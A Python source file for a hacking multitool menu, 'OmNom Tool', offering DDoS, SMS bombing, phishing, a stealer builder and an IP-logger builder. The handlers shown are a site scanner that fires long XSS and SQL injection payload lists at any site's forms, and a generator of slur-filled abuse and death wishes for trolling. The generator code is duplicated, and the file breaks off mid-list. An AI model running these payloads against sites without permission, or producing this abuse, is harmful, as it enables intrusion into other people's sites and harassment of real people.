import random
import ctypes
from ctypes import wintypes
from dataclasses import dataclass, field
from enum import Enum, auto
import requests
import fake_useragent
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import logging
import sys
import json
import os
import base64
from PyQt6.QtWidgets import QApplication, QMainWindow, QWidget, QLabel
from PyQt6.QtCore import Qt, QTimer
from PyQt6.QtGui import QPainter, QColor, QImage, QPalette
from base64 import b64decode
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import asyncio
from collections import deque
import ssl
import shutil
import zipfile
import sqlite3
import socket
import uuid
import platform
from datetime import datetime
import tempfile
import threading
from typing import Optional, List
from dataclasses import dataclass
from colorama import init, Fore, Style
from pystyle import Colorate, Colors, Center
from enum import Enum, auto
from dataclasses import dataclass, field
import urllib.parse
from bs4 import BeautifulSoup
import re, ssl
from urllib.parse import urljoin

BANNER = """ 

                             -------                                                                                                            
                        -=+#@@@@@@@@@@#==-                                                                                                     
                      -*@@@@@@@@@@@@@@@@@#=:                                                                                                   
                    -=@@@@@@@@@@@@@@@@@@@@@#=                    OmNom Tool Пофікшена версія від @qzepx                                                                                
                   -+@@@@@@@@@@@@@@@@@@@@@@@#-                   Будьласка використовуйте в повноекраному режимі                                                                               
                  :*@@@@@@@@@@@@@@@@@@@@@@@@@%:                                                                                                         
                  =#@@@@%++#@@@@@@@@@%++#@@@@@+-     [ 01 ] Вийти                           [ 11 ] Ддос атака                                                                     
                  +@@@@#=  :=@@@@@@@*-  -+@@@@%:     [ 02 ] СМС бомба телеграм                                                           
                 -*@@@@#=   -@@@@@@@+    =@@@@@+     [ 03 ] Око бога фішинг                 [ 13 ] Генерація User Agent                                                                              
                 -%@@@@@+---#@@@@@@@%=--=#@@@@@#-    [ 04 ] Амням гра                       [ 14 ] Осинт по нікнейму                                                                         
                 =@@@@@@@@%@@@@@@@@@@@@%@@@@@@@%-    [ 05 ] Пошта знесення                  [ 15 ] Генератор шаблона дял тролинга                                                                    
                 =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:    [ 06 ] Пошта Бомба(не працює)          [ 16 ] Ваш айпі адресс                                                                     
                 =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-    [ 07 ] Червона Аура для Миші           [ 17 ] SSL XSS SQL Сайт сканер                                                                             
                 =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=    [ 08 ] Стилер білдер                                                                                           
                -*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+    [ 09 ] Айпі Інформація                                                                                           
                -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*=   [ 10 ] Telegraph Айпі логер білдер                                                                                           
               -#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=                                                                                             
              -*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-                            [ ! ] Тгк https://t.me/idiotscam                                                                 
             -+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-                           [ @ ] Софт Від @idiotscam                                                              
             =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#-                          [ $ ] Пофікшено від @qzepx                                                                 
            -%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*-                                                                                          
           -*@@@@@@@@%#**#@@@@@@@@@@@@@%***#@@@@@@@@%=                                                                                          
            =@@@@#=--      -=@@@@@@@*--      --*%@@@*=                                                                                          
              --              -:::--              --

Choose an action ->"""


class DisplayState(Enum):
    BANNER = auto()


@dataclass
class ColorScheme:
    style: str = "red"
    error: tuple = (220, 20, 60)


@dataclass
class ConsoleConfig:
    colors: ColorScheme = field(default_factory=ColorScheme)

    def get_color_code(self, color: tuple) -> str:
        r, g, b = color
        return f"\033[38;2;{r};{g};{b}m"

    def get_reset_code(self) -> str:
        return "\033[0m"


def generate_colorful_banner(banner: str, color_scheme: ColorScheme) -> str:
    red_code = "\033[38;2;255;3;3m"
    return f"{red_code}{banner}\033[0m"

class WindowsConsole:
    def __init__(self):
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        self.handle = self.kernel32.GetStdHandle(-11)

    def setup(self) -> None:
        self._hide_cursor()
        self._enable_virtual_terminal()

    def _hide_cursor(self) -> None:
        class CONSOLE_CURSOR_INFO(ctypes.Structure):
            _fields_ = [("size", ctypes.c_int), ("visible", ctypes.c_byte)]

        cursor_info = CONSOLE_CURSOR_INFO()
        cursor_info.visible = False
        self.kernel32.SetConsoleCursorInfo(self.handle, ctypes.byref(cursor_info))

    def _enable_virtual_terminal(self) -> None:
        mode = wintypes.DWORD()
        if self.kernel32.GetConsoleMode(self.handle, ctypes.byref(mode)):
            self.kernel32.SetConsoleMode(self.handle, mode.value | 0x0004)

class Display:
    def __init__(self):
        self.config = ConsoleConfig()
        self.state = DisplayState.BANNER
        self.error_message: str = ""
        self._setup_console()

    def _setup_console(self) -> None:
        WindowsConsole().setup()

    def render(self) -> None:
        print("\033[2J\033[H", end='')  # Clear screen and move cursor to top
        banner_colored = generate_colorful_banner(BANNER, self.config.colors)
        error_color = self.config.get_color_code(self.config.colors.error)
        reset = self.config.get_reset_code()
        if self.error_message:
            print(f"{error_color}Неверный выбор{reset}")
        print(f"{banner_colored}{reset}", end='')

def process_user_input(display: Display) -> bool:
    choice = input().strip()
    if choice == "1":
        print("Дякую за використання нашого фікса від нас")
        return True


    elif choice == "17":

        import socket
        import requests
        import urllib.parse
        from bs4 import BeautifulSoup
        import re, ssl
        from urllib.parse import urljoin
        import time

        def get_ip(domain):
            try:
                ip = socket.gethostbyname(domain)
                return ip
            except socket.gaierror as e:
                return f"IP not found: {str(e)}"

        def check_ssl(url):
            try:
                parsed_url = urllib.parse.urlparse(url)
                hostname = parsed_url.netloc
                context = ssl.create_default_context()

                with socket.create_connection((hostname, 443), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()

                        issuer = dict(x[0] for x in cert['issuer'])
                        subject = dict(x[0] for x in cert['subject'])

                        return {
                            "Issuer": issuer.get('organizationName', 'N/A'),
                            "Subject": subject.get('commonName', 'N/A'),
                            "Expiry": cert['notAfter'],
                            "Version": cert['version'],
                            "Serial Number": cert['serialNumber']
                        }
            except socket.gaierror as e:
                return f"DNS lookup failed: {str(e)}"
            except socket.timeout:
                return "Connection timed out"
            except ssl.SSLError as e:
                return f"SSL error: {str(e)}"
            except Exception as e:
                return f"Error checking SSL: {str(e)}"

        def check_site_availability(url):
            try:
                response = requests.get(url, timeout=10, verify=False)
                return response.status_code == 200
            except requests.RequestException as e:
                return False

        def test_xss(url):
            try:
                if not check_site_availability(url):
                    return ["Site is not accessible"]

                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }

                response = requests.get(url, headers=headers, verify=False, timeout=10)
                response.raise_for_status()

                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')

                if not forms:
                    return ["No forms found to test"]

                vulnerable_forms = []

                payloads = [
                    '<script>alert(1)</script>',
                    '"><script>alert(1)</script>',
                    '<svg/onload=alert(1)>',
                    '<img src=x onerror=alert(1)>',
                    '<script>prompt(1)</script>',
                    '<script>confirm(1)</script>',
                    '"><svg/onload=alert(1)>',
                    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
                    '<img src=`x`onerror=alert(1)>',
                    '<div onmouseover="alert(1)">hover</div>',
                    '<body onload=alert(1)>',
                    '<object data="javascript:alert(1)">',
                    '<svg><script>alert(1)</script></svg>',
                    '<marquee onstart=alert(1)>',
                    '<isindex type=image src=1 onerror=alert(1)>',
                    '<input onfocus=alert(1) autofocus>',
                    '<input onblur=alert(1) autofocus><input autofocus>',
                    '<video src=1 onerror=alert(1)>',
                    '<audio src=1 onerror=alert(1)>',
                    '"><img src=x onerror=prompt(1)>',
                    '"><img src=x onerror=confirm(1)>',
                    '<script>alert(String.fromCharCode(88,83,83))</script>',
                    '<script>\u0061\u006C\u0065\u0072\u0074(1)</script>',
                    '<svg><script>prompt(1)</script>',
                    '<svg><script>confirm(1)</script>',
                    '"+alert(1)+"',
                    '"onmouseover="alert(1)',
                    '"onfocus="alert(1)',
                    '<marquee loop=1 width=0 onfinish=alert(1)>',
                    '<a href="javascript:alert(1)">Click me</a>',
                    '<table background="javascript:alert(1)">',
                    '<video src=1 onerror=alert(1)>',
                    '<video><source onerror="javascript:alert(1)">',
                    '<form><button formaction="javascript:alert(1)">X',
                    '<frameset onload=alert(1)>',
                    '<select autofocus onfocus=alert(1)>',
                    '<textarea autofocus onfocus=alert(1)>',
                    '<keygen autofocus onfocus=alert(1)>',
                    '<embed src="javascript:alert(1)">',
                    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
                    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                    '<svg><animate onend=alert(1) attributeName=x dur=1s>',
                    '<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>',
                    '<svg><set onbegin=alert(1) attributeName=x>',
                    '<svg><script>alert&#40;1&#41</script>',
                    '<svg><script>alert&#x28;1&#x29</script>',
                    '<svg><script>alert&lpar;1&rpar;</script>',
                    '<svg><script>alert&#40 1&#41</script>',
                    '<object data="javascript&colon;alert(1)">',
                    '<object data="javascript&#58;alert(1)">',
                    '<object data="javascript&#x3A;alert(1)">',
                    '<embed src="javascript&colon;alert(1)">',
                    '<embed src="javascript&#58;alert(1)">',
                    '<embed src="javascript&#x3A;alert(1)">',
                    '<script>onerror=alert;throw 1</script>',
                    '<script>{onerror=alert}throw 1</script>',
                    '<script>throw onerror=alert,1</script>',
                    '<script>throw{set/onerror=alert}/1</script>',
                    '<script>{set/onerror=alert}throw 1</script>',
                    '<script>throw[onerror=alert][1]</script>',
                    '<script>throw[onerror=eval][1]</script>',
                    '<script>throw[onerror=prompt][1]</script>',
                    '<script>throw[onerror=confirm][1]</script>',
                    '<script>throw[onerror=function(){alert()}][1]</script>',
                    '<script>throw[onerror=function(){prompt()}][1]</script>',
                    '<script>throw[onerror=function(){confirm()}][1]</script>',
                    '<script>onmouseover=alert(1)</script>',
                    '<script>onmouseover=prompt(1)</script>',
                    '<script>onmouseover=confirm(1)</script>',
                    '<script>onmouseover=function(){alert()}()</script>',
                    '<script>onmouseover=function(){prompt()}()</script>',
                    '<script>onmouseover=function(){confirm()}()</script>'
                ]

                for form in forms:
                    action = urljoin(url, form.get('action', ''))
                    method = form.get('method', 'get').lower()
                    inputs = form.find_all(['input', 'textarea'])

                    if not inputs:
                        continue

                    for payload in payloads:
                        data = {}
                        for input_field in inputs:
                            input_name = input_field.get('name')
                            if input_name:
                                data[input_name] = payload

                        try:
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, verify=False, timeout=5)
                            else:
                                response = requests.get(action, params=data, headers=headers, verify=False, timeout=5)

                            if payload in response.text:
                                vulnerable_forms.append(
                                    f"XSS vulnerability found in form {action} with payload: {payload}")
                        except requests.RequestException:
                            continue

                        time.sleep(0.1)

                return vulnerable_forms if vulnerable_forms else ["No XSS vulnerabilities found"]

            except requests.RequestException as e:
                return [f"Error during XSS scan: {str(e)}"]
            except Exception as e:
                return [f"Unexpected error during XSS scan: {str(e)}"]

        def test_sql_injection(url):
            try:
                if not check_site_availability(url):
                    return ["Site is not accessible"]

                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }

                response = requests.get(url, headers=headers, verify=False, timeout=10)
                response.raise_for_status()

                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')

                if not forms:
                    return ["No forms found to test"]

                vulnerabilities = []

                # Ваши SQL payloads остаются теми же
                payloads = [
                    "' OR '1'='1",
                    "' OR '1'='1' --",
                    "1' OR '1'='1",
                    "admin' --",
                    "admin' #",
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' OR 1=1 #",
                    "' OR 1=1 -- -",
                    "' OR 'x'='x",
                    "1) or '1'='1--",
                    "1) or ('1'='1--",
                    "1' or '1'='1",
                    "1'1",
                    "1 exec sp_ (or exec xp_)",
                    "1 and 1=1",
                    "1' and 1=(select count(*) from tablenames); --",
                    "1 or 1=1",
                    "1' or '1'='1",
                    "1or1=1",
                    "1'or'1'='1",
                    "fake@ema'or'il.nl'='il.nl",
                    "1 or sleep(5)#",
                    "' or sleep(5)#",
                    "\" or sleep(5)#",
                    "' or sleep(5)='",
                    "' or benchmark(100000,MD5(1))#",
                    "' or benchmark(100000,MD5(1))='",
                    "or 1=1",
                    "' or 1=1--",
                    "' or 1=1#",
                    "' or 1=1/*",
                    "') or '1'='1--",
                    "') or ('1'='1--",
                    "' or '1'='1",
                    "' or 1--",
                    " or 1=1--",
                    " or 1=1#",
                    " or 1=1/*",
                    ") or '1'='1--",
                    ") or ('1'='1--",
                    "' or 1=1--",
                    "')) or 1=1--",
                    "))) or 1=1--",
                    "' or a=a--",
                    "' or 'a'='a",
                    "') or ('a'='a",
                    "' or 3=3--",
                    "' or 3=3#",
                    "' or 3=3/*",
                    "1') or '1'='1--",
                    "1' or '1'='1' or '1'='1",
                    "1' or '1'='1' or 'a'='a",
                    "1' or '1'='1' or 'a'='a'--",
                    "1' or '1'='1' or 'a'='a'#",
                    "1' or '1'='1' or 'a'='a'/*",
                    "1' or '1'='1' or id=1--",
                    "1' or '1'='1' or id=1#",
                    "1' or '1'='1' or id=1/*",
                    "' or ''='",
                    "1' or ''='",
                    "' or ''=''--",
                    "1' or ''=''--",
                    "' or ''=''#",
                    "1' or ''=''#",
                    "' or ''=''/*",
                    "1' or ''=''/*",
                    "1'or'1'='1'or'1'='1",
                    "1'or'1'='1'or'a'='a",
                    "1'or'1'='1'or'a'='a'--",
                    "1'or'1'='1'or'a'='a'#",
                    "1'or'1'='1'or'a'='a'/*",
                    "1'or'1'='1'or id=1--",
                    "1'or'1'='1'or id=1#",
                    "1'or'1'='1'or id=1/*",
                    "admin' or '",
                    "admin' or '1'='1",
                    "admin' or '1'='1'--",
                    "admin' or '1'='1'#",
                    "admin' or '1'='1'/*",
                    "admin'or'1'='1",
                    "admin'or'1'='1'--",
                    "admin'or'1'='1'#",
                    "admin'or'1'='1'/*",
                    "admin'or id=1--",
                    "admin'or id=1#",
                    "admin'or id=1/*",
                    "') or true--",
                    "') or ('')=('",
                    "') or ('x')=('x",
                    "')) or (('x'))=(('x",
                    "' or true--",
                    "' or ('')=('",
                    "' or ('x')=('x",
                    "')) or (('x'))=(('x",
                    "' or ''^'",
                    "1' or ''^'",
                    "' or ''*'",
                    "1' or ''*'",
                    "' or ''+''+'",
                    "1' or ''+''+'",
                    "' or '1'='1' LIMIT 1--",
                    "1' or '1'='1' LIMIT 1--",
                    "' or '1'='1' LIMIT 1#",
                    "1' or '1'='1' LIMIT 1#",
                    "' or '1'='1' LIMIT 1/*",
                    "1' or '1'='1' LIMIT 1/*",
                    "' or 'x'='x' AND MID(version(),1,1)='5'",
                    "1' or 'x'='x' AND MID(version(),1,1)='5'",
                    "' or 'x'='x' AND MID(version(),1,1) like '5'",
                    "1' or 'x'='x' AND MID(version(),1,1) like '5'",
                    "' or 'x'='x' AND MID(version(),1,1) like '5%'",
                    "1' or 'x'='x' AND MID(version(),1,1) like '5%'",
                    "' or 'x'='x' AND MID(version(),1,1) between '5' and '9'",
                    "1' or 'x'='x' AND MID(version(),1,1) between '5' and '9'",
                    "' or 'x'='x' AND version() like '5%'",
                    "1' or 'x'='x' AND version() like '5%'",
                    "' or 'x'='x' AND version() like '%5%'",
                    "1' or 'x'='x' AND version() like '%5%'",
                    "' or 'x'='x' AND version() between '5' and '9'",
                    "1' or 'x'='x' AND version() between '5' and '9'",
                    "' or 'x'='x' AND username like 'a%'",
                    "1' or 'x'='x' AND username like 'a%'",
                    "' or 'x'='x' AND username like '%a%'",
                    "1' or 'x'='x' AND username like '%a%'",
                    "' or 'x'='x' AND username between 'a' and 'z'",
                    "1' or 'x'='x' AND username between 'a' and 'z'",
                    "' or 'x'='x' AND username in ('a','b','c')",
                    "1' or 'x'='x' AND username in ('a','b','c')",
                    "' or 'x'='x' AND username='admin'",
                    "1' or 'x'='x' AND username='admin'",
                ]

                for form in forms:
                    action = urljoin(url, form.get('action', ''))
                    method = form.get('method', 'get').lower()
                    inputs = form.find_all(['input', 'textarea'])

                    if not inputs:
                        continue

                    for payload in payloads:
                        data = {}
                        for input_field in inputs:
                            input_name = input_field.get('name')
                            if input_name:
                                data[input_name] = payload

                        try:
                            if method == 'post':
                                response = requests.post(action, data=data, headers=headers, verify=False, timeout=5)
                            else:
                                response = requests.get(action, params=data, headers=headers, verify=False, timeout=5)

                            error_patterns = [
                                'SQL syntax',
                                'mysql_fetch',
                                'ORA-',
                                'PostgreSQL',
                                'SQL error',
                                'SQLite',
                                'SQLSTATE',
                                'Warning: mysql_',
                                'Warning: pg_',
                                'Warning: sqlite_',
                                'MySQL Error',
                                'MySQL ODBC',
                                'MySQL Driver',
                                'mysqli_fetch',
                                'PostgreSQL Error',
                                'pg_fetch',
                                'sqlite3_',
                                'JDBC Driver',
                                'ODBC Driver',
                                'Incorrect syntax',
                                'Syntax error',
                                'OLE DB Provider',
                                'JET Database',
                                'Microsoft Access Driver',
                                '[Microsoft][ODBC SQL Server Driver]',
                                '[Microsoft][ODBC Microsoft Access Driver]',
                                'You have an error in your SQL syntax',
                                'Microsoft SQL Native Client error',
                                'Microsoft OLE DB Provider for ODBC Drivers',
                                'Microsoft OLE DB Provider for SQL Server',
                                'Microsoft SQL Server Native Client',
                                'SQLServer JDBC Driver',
                                'ODBC SQL Server Driver',
                                'ODBC Driver Manager',
                                'System.Data.OleDb.OleDbException',
                                'System.Data.SqlClient.SqlException',
                                '[SQL Server]',
                                'Unclosed quotation mark after the character string',
                                'Division by zero in SQL statement',
                                'supplied argument is not a valid MySQL',
                                'Column count doesnt match value count at row',
                                'Unclosed quotation mark before the character string',
                                'Error Executing Database Query',
                                'Syntax error or access violation',
                                'ERROR [0-9]{4}',
                                'Query failed',
                                'SQL command not properly ended',
                                'unexpected end of SQL command',
                                'invalid query',
                                'SQL command not properly ended',
                                '[MySQL][ODBC',
                                'Database error',
                                'DB Error',
                                'SQL Error'

                            ]

                            for pattern in error_patterns:
                                if pattern.lower() in response.text.lower():
                                    vulnerabilities.append(
                                        f"SQL injection vulnerability found in form {action} with payload: {payload}")
                                    break

                        except requests.RequestException:
                            continue

                        time.sleep(0.1)

                return vulnerabilities if vulnerabilities else ["No SQL injection vulnerabilities found"]

            except requests.RequestException as e:
                return [f"Error during SQL injection scan: {str(e)}"]
            except Exception as e:
                return [f"Unexpected error during SQL injection scan: {str(e)}"]

        def main():
            try:
                url = input("Enter URL to scan: ")

                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url

                print("\n=== Scan started ===")

                print("\n[+] IP address:")
                ip = get_ip(urllib.parse.urlparse(url).netloc)
                print(ip)

                print("\n[+] SSL Certificate Info:")
                ssl_info = check_ssl(url)
                if isinstance(ssl_info, dict):
                    for key, value in ssl_info.items():
                        print(f"{key}: {value}")
                else:
                    print(ssl_info)

                if not check_site_availability(url):
                    print("\nSite is not accessible. Stopping scan.")
                    return

                print("\n[+] XSS scan:")
                xss_results = test_xss(url)
                for result in xss_results:
                    print(result)

                print("\n[+] SQL injection scan:")
                sql_results = test_sql_injection(url)
                for result in sql_results:
                    print(result)

            except KeyboardInterrupt:
                print("\nScan interrupted by user")
            except Exception as e:
                print(f"\nUnexpected error: {str(e)}")
            finally:
                print("\n=== Scan completed ===")

        if __name__ == "__main__":
            main()

        return False

    elif choice == "16":

        import socket
        import os

        def get_ip():
            try:
                hostname = socket.gethostname()
                ip_address = socket.gethostbyname(hostname)
                return ip_address
            except:
                return "Не удалось определить IP-адрес"

        def main():
            os.system('cls' if os.name == 'nt' else 'clear')

            ip = get_ip()
            print(f"Ваш IP-адрес: {ip}")

            input("\nНажмите Enter для выхода в главное меню...")

        if __name__ == "__main__":
            main()

        return False

    elif choice == "15":
        import random

        class TrollGenerator:
            def __init__(self):
                self.troll_intro = [
                    "Итак, слушай, ничтожество,", "Позволь мне начать, кусок дерьма,", "Внимание, тупая мразь,",
                    "Приготовься, ублюдок,", "Слушай сюда, падла,", "Начнём, говно,",
                    "Сейчас ты узнаешь, кто ты, чмо,", "Пора приступить, уёбок,", "Ты готов, отброс?",
                    "Внимай, говножуй,", "Тебя ждёт сюрприз, мудак,", "Скоро ты всё поймёшь, ублюдок,",
                    "Давай начнём, тупая скотина,", "Приготовь свои уши, говнюк,",
                    "Слушай, мерзкая тварь,", "Встречай свой приговор, ничтожество,",
                    "Готовься к унижению, пидор,", "Сейчас тебе будет больно, сука,",
                    "Начнём представление, урод,", "Слушай внимательно, конченный,",
                    "Приготовься к правде, мразота,", "Слушай сюда, генетический мусор,",
                    "Открой свои гнилые уши, отброс,", "Внимание, биологическая ошибка,",
                    "Слушай сюда, результат пьяного зачатия,", "Приготовься, сын свиноматки,",
                    "Эй ты, последствие неудачного аборта,", "Внимай, недоразвитое существо,",
                    "Слушай сюда, результат инцеста,", "Готовься, мутировавшее чмо,"
                ]

                self.troll_start = [
                    "Ты, блядская", "Эй, говно на палке,", "Послушай, кусок дерьма,",
                    "Ты, ебаное чмо,", "Ты, тупорылая мразь,", "Ты, пидор ебаный,",
                    "А ну, завали ебало, уёбок,", "Ты, мерзкая шваль,", "Ты, ебаная падла,",
                    "Ты, тупая пизда,", "Ты, конченая тварь,", "Ты, выблядок ебаный,",
                    "Ты, ничтожество вонючее,", "Ты, гнида поганая,",
                    "Ты, генетический мусор,", "Эй, ходячая помойка,",
                    "Ты, бездарное создание,", "Слышь, мешок с говном,",
                    "Ты, результат пьяной случки,", "Эй, биологический мусор,",
                    "Ты, ошибка эволюции,", "Послушай, недоразумение природы,",
                    "Ты, позор человечества,", "Эй, дегенеративная форма жизни,",
                    "Ты, мутант недоделанный,", "Слышь, космический мусор,"
                ]

                self.troll1 = [
                    "ебанный", "выебанный", "припизднутый", "без мамный", "слабоумный", "никчемный",
                    "тупой", "тупорылый", "конченый", "уебищный", "опущенный", "пидорский",
                    "жалкий", "гнилой", "вонючий", "уродливый", "дегенеративный",
                    "вшивый", "засранный", "протухший", "заплесневелый", "убогий",
                    "безмозглый", "недоразвитый", "скудоумный", "дефективный",
                    "слабохарактерный", "неполноценный", "умственно-отсталый",
                    "генетически-дефектный", "душевнобольной", "психически-нестабильный",
                    "социально-деградированный", "морально-разложившийся", "интеллектуально-ограниченный",
                    "эволюционно-отсталый", "мутантно-деформированный", "биологически-неполноценный"
                ]

                self.troll2 = [
                    "ишак", "осел", "даун", "ослик", "хуесос", "пиздабол", "ебанный сыр",
                    "глиномес", "залупа", "говноед", "пидорас", "сука", "мудак",
                    "чмо", "уёбок", "выродок", "падаль", "тварь", "хуйня",
                    "мразота", "генетический мусор", "биологический сбой",
                    "ошибка природы", "недоразумение эволюции", "мутант",
                    "дегенерат", "отброс общества", "паразит",
                    "биомусор", "генетический брак", "ублюдок природы",
                    "урод генетический", "шлак эволюции", "мусор человечества",
                    "паразит общества", "биологическая ошибка", "генетическая катастрофа",
                    "эволюционный тупик", "социальная раковая опухоль"
                ]

                self.troll3 = [
                    "ничем не отличается от", "не отличается по уму от", "не отличается от",
                    "такой же как", "как две капли похож на", "один в один как",
                    "копия", "точная копия", "реинкарнация", "клон", "как говно на",
                    "хуже чем", "омерзительнее чем", "более никчемный чем",
                    "более тупой чем", "более жалкий чем", "гаже чем",
                    "более мерзкий чем", "более вонючий чем", "более убогий чем",
                    "более дегенеративный чем", "более тошнотворный чем",
                    "более отвратительный чем", "более ничтожный чем",
                    "более презренный чем", "более уродливый чем"
                ]

                self.troll4 = [
                    "ебанной шлюхи", "коровы", "собаки", "шлюхи", "проститутки", "швали", "мухи",
                    "крысы", "обезьяны", "гориллы", "бляди", "овцы", "гниды",
                    "таракана", "червяка", "блохи", "вши", "клопа", "слизняка",
                    "протухшего трупа", "гниющей падали", "разлагающейся туши",
                    "кучи компоста", "сточной канавы", "выгребной ямы",
                    "мусорной кучи", "помойного ведра", "сгнившего мяса",
                    "протухшей рыбы", "прокисшего молока", "заплесневелого хлеба",
                    "использованного презерватива", "грязного памперса", "свиного корыта",
                    "общественного туалета", "канализационного стока"
                ]

                self.troll5 = [
                    "отца твоего", "мать твою", "всю родню твою", "тебя",
                    "твою бабушку", "твоего деда", "твоих предков", "твоих детей",
                    "твоих соседей", "твоего кота", "твою собаку", "твоего хомячка",
                    "всю твою генетическую линию", "твой род проклятый",
                    "твоё семейное древо гнилое", "твою родословную проклятую",
                    "твоих будущих детей", "твоих потомков", "твою династию",
                    "твой генетический код", "твою ДНК мутировавшую",
                    "твоих предков до седьмого колена", "твоё потомство",
                    "твою семейную честь", "твой фамильный герб", "твою кровь"
                ]

                self.troll6 = [
                    "весь двор", "весь район", "весь город", "вся страна", "весь мир",
                    "каждые вторые челики", "каждые третие челики", "все бомжи", "все алкаши",
                    "все дебилы", "все пидорасы", "все наркоманы", "все тупые мрази", "все нищеброды",
                    "все представители низшего общества", "вся генетическая помойка",
                    "все отбросы эволюции", "все мутанты района", "все деграданты",
                    "вся биологическая грязь", "все паразиты общества",
                    "весь генетический мусор", "все дегенераты планеты",
                    "вся социальная раковая опухоль", "все ошибки природы",
                    "все представители низшей касты", "вся биологическая плесень"
                ]

                self.troll7 = [
                    "ебали", "трахали", "ногами пиздили", "до крови избивали",
                    "на колени ставили", "плювали в лицо", "в жопу драли", "на хуй сажали",
                    "заставляли хуй сосать", "говном мазали", "ебали в рот", "срали в рот",
                    "мочой поливали", "в дерьме купали", "говном кормили",
                    "как тряпку использовали", "как мусор выбрасывали",
                    "как отброс общества презирали", "ногами топтали",
                    "как грязь под ногами считали", "как биомусор утилизировали",
                    "в помойку выкидывали", "как генетический мусор сортировали",
                    "на опыты брали", "как подопытных крыс использовали",
                    "в зоопарке показывали", "в цирке уродов выставляли"
                ]

                self.troll_end = [
                    "и это ещё мягко сказано!", "иди нахуй, мразь!", "заткнись, говно!",
                    "ты хуже говна!", "ты ебаный ублюдок!", "ты кусок дерьма!", "сдохни, сука!",
                    "я тебя ненавижу, пидор!", "я тебе ебало разобью!", "ты меня заебал, тупая пизда!",
                    "ты биологический мусор!", "тебя природа обсерала!",
                    "ты генетическая катастрофа!", "тебя эволюция прокляла!",
                    "ты позор человечества!", "тебя даже черви не съедят!",
                    "ты даже для опарышей слишком мерзкий!", "твоё ДНК просит о смерти!",
                    "твои гены молят о забвении!", "ты ошибка матери-природы!",
                    "тебя даже инфузории презирают!", "твоя генетика просит эвтаназии!",
                    "ты биологическая аномалия!", "тебя наука отвергает!",
                    "ты эволюционный тупик!", "твоё существование - ошибка!"
                ]

                self.troll_conclusion = [
                    "В заключение скажу, ты - полное дерьмо!", "Итак, подведём итог: ты - ничто!",
                    "В конце концов, ты - просто мусор!", "Короче, ты - кусок говна!",
                    "Заканчивая, скажу: ты - жалкая мразь!", "И напоследок: ты - конченый уёбок!",
                    "В завершение: ты хуже дерьма!", "И в конце: ты заслуживаешь смерти!",
                    "Подводя итог: ты - генетическая катастрофа!",
                    "Заключительный вердикт: ты - ошибка эволюции!",
                    "Финальный диагноз: ты - биологический мусор!",
                    "В итоге: твоё существование - насмешка природы!",
                    "Окончательный вывод: ты - мутант недоделанный!",
                    "Резюмируя: ты - позор человеческого рода!",
                    "Финальное заключение: ты - генетический брак!",
                    "Последний штрих: природа на тебе отдохнула!",
                    "В завершение скажу: ты - биологическая ошибка!",
                    "Итоговый вердикт: тебя даже червям противно жрать!",
                    "Окончательный приговор: ты - эволюционный тупик!",
                    "Последнее слово: тебя даже бактерии презирают!"
                ]

        import random

        class TrollGenerator:
            def __init__(self):
                self.troll_intro = [
                    "Итак, слушай, ничтожество,", "Позволь мне начать, кусок дерьма,", "Внимание, тупая мразь,",
                    "Приготовься, ублюдок,", "Слушай сюда, падла,", "Начнём, говно,",
                    "Сейчас ты узнаешь, кто ты, чмо,", "Пора приступить, уёбок,", "Ты готов, отброс?",
                    "Внимай, говножуй,", "Тебя ждёт сюрприз, мудак,", "Скоро ты всё поймёшь, ублюдок,",
                    "Давай начнём, тупая скотина,", "Приготовь свои уши, говнюк,",
                    "Слушай, мерзкая тварь,", "Встречай свой приговор, ничтожество,",
                    "Готовься к унижению, пидор,", "Сейчас тебе будет больно, сука,",
                    "Начнём представление, урод,", "Слушай внимательно, конченный,",
                    "Приготовься к правде, мразота,", "Слушай сюда, генетический мусор,",
                    "Открой свои гнилые уши, отброс,", "Внимание, биологическая ошибка,",
                    "Слушай сюда, результат пьяного зачатия,", "Приготовься, сын свиноматки,",
                    "Эй ты, последствие неудачного аборта,", "Внимай, недоразвитое существо,",
                    "Слушай сюда, результат инцеста,", "Готовься, мутировавшее чмо,"
                ]

                self.troll_start = [
                    "Ты, блядская", "Эй, говно на палке,", "Послушай, кусок дерьма,",
                    "Ты, ебаное чмо,", "Ты, тупорылая мразь,", "Ты, пидор ебаный,",
                    "А ну, завали ебало, уёбок,", "Ты, мерзкая шваль,", "Ты, ебаная падла,",
                    "Ты, тупая пизда,", "Ты, конченая тварь,", "Ты, выблядок ебаный,",
                    "Ты, ничтожество вонючее,", "Ты, гнида поганая,",
                    "Ты, генетический мусор,", "Эй, ходячая помойка,",
                    "Ты, бездарное создание,", "Слышь, мешок с говном,",
                    "Ты, результат пьяной случки,", "Эй, биологический мусор,",
